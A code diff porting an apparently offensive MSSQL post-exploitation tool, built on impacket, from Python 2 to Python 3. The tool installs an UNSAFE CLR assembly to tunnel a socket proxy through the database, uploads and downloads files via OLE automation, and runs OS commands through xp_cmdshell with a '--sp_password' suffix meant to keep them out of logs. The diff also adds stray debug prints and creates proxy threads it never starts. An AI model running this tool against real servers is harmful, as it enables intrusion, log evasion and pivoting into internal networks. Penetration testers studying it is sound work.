@@ -23,7 +23,7 @@ import os
 import logging
 
 import socket
-import thread
+import threading
 import select
 
 from impacket.examples import logger
@@ -33,9 +33,9 @@ from impacket import version, tds
 
 # Proxy config
 
-MSG_END_OF_TRANSIMISSION = "\x31\x41\x59\x26\x53\x58\x97\x93\x23\x84"
-MSG_EXIT_CMD = "\x12\x34\x56"
-MSG_EXIT_ACK = "\x65\x43\x21"
+MSG_END_OF_TRANSIMISSION = b"\x31\x41\x59\x26\x53\x58\x97\x93\x23\x84"
+MSG_EXIT_CMD = b"\x12\x34\x56"
+MSG_EXIT_ACK = b"\x65\x43\x21"
 
 ASSEMBLY_NAME = "Microsoft.SqlServer.Proxy"
 PROCEDURE_NAME = "sp_start_proxy"
@@ -57,7 +57,9 @@ def check_configuration(mssql, option, value):
 
 def file_exists(mssql, path):
     try:
-        res = mssql.batch("DECLARE @r INT; EXEC master.dbo.xp_fileexist '%s', @r OUTPUT; SELECT @r as n" % path)[0]['n']    
+        res = mssql.batch("DECLARE @r INT; EXEC master.dbo.xp_fileexist '%s', @r OUTPUT; SELECT @r as n" % path)[0]['n']
+        print('1111111111')
+        print(res)
         return res == 1
     except:
         return False
@@ -78,7 +80,7 @@ def proxy_install(mssql, args):
         
     
     with open(args.clr, 'rb') as f:
-        data = f.read().encode('hex')
+        data = f.read().hex()
         
         mssql.batch("USE msdb; CREATE ASSEMBLY [%s] FROM 0x%s WITH PERMISSION_SET = UNSAFE" % (ASSEMBLY_NAME, data))
         res = mssql.batch("USE msdb; SELECT COUNT(*) AS n FROM sys.assemblies where name = '%s'" % ASSEMBLY_NAME)[0]['n']
@@ -217,9 +219,9 @@ def proxy_start(mssql, args):
         mssql.batch("DECLARE @ip varchar(15); SET @ip=TRIM(CONVERT(char(15), CONNECTIONPROPERTY('client_net_address')));"
                     "EXEC msdb.dbo.%s '%s', @ip, %d" % (PROCEDURE_NAME, args.reciclador, lport), tuplemode=False, wait=False)
         data = mssql.socket.recv(2048)
-        if 'Powered by blackarrow.net' in data:
+        if b'Powered by blackarrow.net' in data:
             logging.info("ACK from server!")
-            mssql.socket.sendall("ACK")
+            mssql.socket.sendall(b"ACK")
         else:
             logging.error("cannot establish connection")
             raise Exception('cannot establish connection')
@@ -227,7 +229,7 @@ def proxy_start(mssql, args):
         s.listen(10)
         while True:
             client, _ = s.accept()
-            thread.start_new_thread(proxy_worker, (mssql.socket, client))
+            threading.Thread(target=proxy_worker, args=(mssql.socket, client))
 
     except:
         mssql.socket.sendall(MSG_EXIT_CMD)
@@ -281,11 +283,11 @@ if __name__ == '__main__':
                 data = self.sql.rows[0]['BulkColumn']
 
                 with open(local, 'wb') as f:
-                    f.write(data.decode('hex'))
+                    f.write(bytes.fromhex(data.decode()))
 
                 print("[+] Download completed")
-            except:
-                pass
+            except Exception as e:
+                print(str(e))
 
         def do_upload(self, params):
             try:
@@ -303,7 +305,7 @@ if __name__ == '__main__':
                 with open(local, 'rb') as f:
                     data = f.read()
                     print("[+] Size is %d bytes" % len(data))
-                    hexdata = "0x%s" % data.encode('hex')
+                    hexdata = "0x%s" % data.hex()
 
                     self.sql.sql_query("DECLARE @ob INT;"
                                        "EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;"
@@ -317,10 +319,9 @@ if __name__ == '__main__':
                     if file_exists(self.sql, remote):
                         print("[+] Upload completed")
                     else:
-                        print("[-] Error uploading")                    
-            except:
-                print("[-] Error uploading")   
-                pass
+                        print("[-] Error uploading - writable?")                    
+            except Exception as e:
+                print("[-] Error - " + str(e))
 
         def do_enable_ole(self, line):
             try:
@@ -351,7 +352,7 @@ if __name__ == '__main__':
 
         def do_xp_cmdshell(self, s):
             try:
-                self.sql.sql_query("exec master..xp_cmdshell '%s'--sp_password" % s)
+                self.sql.sql_query("exec master..xp_cmdshell '%s'--sp_password" % s.replace("'", "''"))
                 self.sql.printReplies()
                 self.sql.colMeta[0]['TypeData'] = 80*2
                 self.sql.printRows()
